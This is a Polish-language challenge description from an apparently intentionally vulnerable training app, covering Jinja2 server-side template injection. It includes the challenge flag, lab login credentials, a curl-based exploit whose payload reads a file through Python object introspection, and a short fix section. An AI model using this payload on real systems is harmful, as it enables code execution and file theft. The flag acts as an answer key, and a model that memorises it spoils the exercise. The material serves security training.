# A18 — Server-Side Template Injection

## Metadane
- **ID:** A18
- **Kategoria:** OWASP A05:2025 - Injection / CWE-94
- **Trudność:** hard
- **Punkty:** 200
- **Flaga:** `PWR{t1mpl4t3_inj3ct10n}`

## Opis
Endpoint `/api/challenges/a18/render` renderuje szablon Jinja2 na podstawie parametru `template`.
Aplikacja nie sprawdza ani nie ogranicza tej wartości, co pozwala na zdalne wykonanie kodu
przez wyrażenia w silniku szablonów.

## Podatny endpoint
```
GET /api/challenges/a18/render?template=<Jinja2 expression>
Authorization: Bearer <twój_token>
```

## Exploit
1. Użyj endpointu `/api/challenges/a18/setup`, aby zapisać plik z flagą.
2. Wykorzystaj SSTI, aby odczytać plik `flag_a18.txt`.

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -G http://localhost:5000/api/challenges/a18/setup
curl -G http://localhost:5000/api/challenges/a18/render \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "template={{ ''.__class__.__mro__[1].__subclasses__()[40]('flag_a18.txt').read() }}"
```

## Hint
Jeśli aplikacja renderuje Twój szablon Jinja2, możesz spróbować odczytać plik z flagą.

## Jak to naprawić
Zastąp `render_template_string()` bez sprawdzenia wejścia bezpiecznym, ograniczonym szablonem,
np. bez dostępu do funkcji systemowych i bez `__class__`.

## Referencje
- [CWE-94: Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)
- [OWASP Server-Side Template Injection](https://owasp.org/www-community/attacks/Server_Side_Template_Injection)
